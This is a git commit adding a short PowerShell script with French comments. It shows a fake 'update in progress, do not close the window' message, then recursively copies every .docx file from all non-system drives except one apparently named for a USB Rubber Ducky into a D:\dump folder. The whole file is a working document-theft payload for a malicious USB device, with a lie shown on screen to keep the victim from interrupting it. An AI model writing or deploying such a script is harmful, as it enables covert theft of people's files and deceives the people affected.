856d0c3b78310a06df7d55260622b184346dd0f1
Simon <androz2091@gmail.com>
2023-05-15 16:50:02 +0200

    Create copy_docx_files.ps1

---
+++ copy_docx_files.ps1
@@ -0,0 +1,35 @@
+Write-Host "UNE MISE A JOUR EST EN COURS, MERCI DE NE PAS FERMER LA FENETRE"
+
+# Récupère une liste de tous les volumes montés
+$drives = Get-WmiObject -Class Win32_LogicalDisk
+
+# Parcourt chaque volume
+foreach ($drive in $drives) {
+    # Si le nom du volume ne contient pas "Ducky" et n'est pas le disque système
+    if ($drive.VolumeName -notcontains "Ducky" -and $drive.DeviceID -ne "C:") {
+        # Affiche les informations du volume
+        $drive | Select-Object DeviceID, VolumeName, Description
+
+        # Change le répertoire de travail pour être le répertoire racine du volume
+        Set-Location -Path $drive.DeviceID
+
+        # Initialise une liste vide pour les fichiers
+        $files = @()
+
+        # Tente de trouver tous les fichiers dans le répertoire courant et ses sous-répertoires
+        try {
+            $files = Get-ChildItem -Path "*.docx" -Recurse -File -ErrorAction Stop
+        }
+        catch {
+            Write-Host "Erreur lors de la récupération des fichiers : $_"
+        }
+
+        foreach ($file in $files) {
+            $destinationPath = "D:\\dump\$($file.Name)"
+            # Si le fichier n'existe pas déjà dans la destination, le copie
+            if (!(Test-Path -Path $destinationPath)) {
+                Copy-Item -Path $file.FullName -Destination $destinationPath
+            }
+        }
+    }
+}
